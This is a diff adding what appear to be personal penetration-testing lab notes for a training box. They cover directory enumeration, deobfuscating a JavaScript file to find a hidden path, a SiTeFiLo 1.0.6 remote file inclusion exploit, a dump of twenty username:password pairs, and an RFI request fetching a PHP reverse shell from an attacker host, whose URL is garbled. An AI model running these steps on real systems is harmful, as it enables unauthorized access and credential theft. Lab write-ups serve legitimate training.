@@ -1,0 +1,122 @@
+# pure web enumeration and exploitation
+
+# directories enumeration
+nikto -h http://$IP
+ffuf ...
+gobuster ...
+	http://10.11.1.133/_vti_cnf           
+	http://10.11.1.133/_vti_bin           
+	http://10.11.1.133/_vti_pvt           
+	http://10.11.1.133/_vti_txt           
+	http://10.11.1.133/bak               
+	http://10.11.1.133/check.php (phpinfo)  
+	http://10.11.1.133/error.html         
+	http://10.11.1.133/error              
+	http://10.11.1.133/iissamples 
+		http://10.11.1.133/iissamples/exair/howitworks/Code.asp
+		http://10.11.1.133/iissamples/issamples/codebrws.asp        
+	http://10.11.1.133/index              
+	http://10.11.1.133/index.asp          
+	http://10.11.1.133/login.asp          
+	http://10.11.1.133/login              
+	http://10.11.1.133/Sites
+		http://10.11.1.133/Sites/Knowledge/Membership/Inspired/ViewCode.asp           
+	http://10.11.1.133/test               
+	http://10.11.1.133/test.asp
+	http://10.11.1.133/icons/README 
+
+# reveal hidden script file name in http://10.11.1.133/test.asp
+http://10.11.1.133/hidd3n-script
+
+var _0x5490 = ["length", " ", "offsecphun1.gif", "offsecphun2.png", "getSeconds", "floor", "<img src=\'", "\'>", "write", "offsecphun5.bmp", "d6467e109c1606ed29", "-", "1f2e73705207bd", "21213/"];
+	var sillydate = 0;
+	var sillyvar = 0;
+	function StringArray(tyller) {
+	  this.length = tyller;
+	  for (var kieisha = 1; kieisha <= tyller; kieisha++) {
+	    this[kieisha] = " ";
+	  };
+	};
+	image = new StringArray(10);
+	image[0] = "offsecphun1.gif";
+	image[1] = "offsecphun2.png";
+	image[2] = "offsecphun1.gif";
+	image[3] = "offsecphun2.png";
+	image[4] = "offsecphun1.gif";
+	image[5] = "offsecphun2.png";
+	image[6] = "offsecphun1.gif";
+	image[7] = "offsecphun2.png";
+	image[8] = "offsecphun2.png";
+	image[9] = "offsecphun2.png";
+	var ran = 60 / image.length;
+	function mylaya() {
+	  sillydate = new Date;
+	  sillyvar = sillydate.getSeconds();
+	  sillyvar = Math.floor(sillyvar / ran);
+	  return image[sillyvar];
+	};
+	function kater(kitina) {
+	  var hmmmm = document.createElement("img");
+	  hmmmm.src = "/" + kitina;
+	  document.body.appendChild(hmmmm);
+	}
+	//kater("1f2e73705207bdd6467e109c1606ed29-21213/" + mylaya());
+	document.write("<img src='" + mylaya() + "'>");
+
+# by deobfuscating the js code we can that there is a line of code has been commented out, which reveral a directory name
+# using different tools are likely to find out something new
+/1f2e73705207bdd6467e109c1606ed29-21213
+
+# go enumerate the directroies again then get a login page and version page
+http://10.11.1.133/1f2e73705207bdd6467e109c1606ed29-21213/111111111/
+http://10.11.1.133/1f2e73705207bdd6467e109c1606ed29-21213/111111111/version
+
+# and a number of pages that contain service information then reveal service verison
+SiTeFiLo 1.0.6
+
+# public exploit 
+Simple Text-File Login script (SiTeFiLo) 1.0.6 - File Disclosure / Remote File Inclusion | php/webapps/7444.txt
+
+# RCE vulerability and user credentails have been found
+/[path]/slogin_lib.inc.php?slogin_path=[remote_txt_shell]
+
+Jimmy:GKWL7VgQe7fvFyt
+George:ExYyp658XULg3rD
+Matt:xmBG4LEX7BUD385
+Johan:3pMstG4ZUpdM4mF
+Kevin:2ddpWN2KRGK69hn
+Mark:PMnVP4asv5x8J3L
+Larry:hNLn3B9TNfV2kZN
+Kibosh:fbX8kAx3Y7ycgnm
+Nettie:R4eCSFLQNqV4FuK
+Nancy:g9RuZddqnmv9C5J
+Karen:QnnV2Y3MsqzeV4E
+Casper:XzyHMFBDQaPHZ4L
+Stanley:vtHNNzYTNLu4MZL
+Peter:bLwpUmYpDE5L3e3
+Jane:6U576vcsQg3NtU7
+Jan:RJWb4fGkFfaxFEU
+Corry:Pkj8d2d2ngZyEd6
+Javier:nXXRhA7TgjBVduS
+Sandra:2Yk2YamVgE4auc7
+Illa: c5sVrVa7jGSBjU7
+
+# change php reverse shell name to fit the server inclusion and execute
+/shell.txtheader.inc.php
+
+# activate and execute reverse shell remotely
+10.11.1.133/1f2e73705207bdd6467e109c1606ed29-21213/111111111/slogin_lib.inc.php?slogin_path=http10.11.1.133/1f2e73705207bdd6467e109c1606ed29-21213/111111111/slogin_lib.inc.php?slogin_path=http://192.168.119.201:9000/shell.txt://192.168.119.201:9000/shell.txt
+
+# get access and find user
+Kibosh
+
+# switch user with found password
+su kibosh
+
+# sudo ALL access is allowed
+sudo -l
+
+
+
+
+
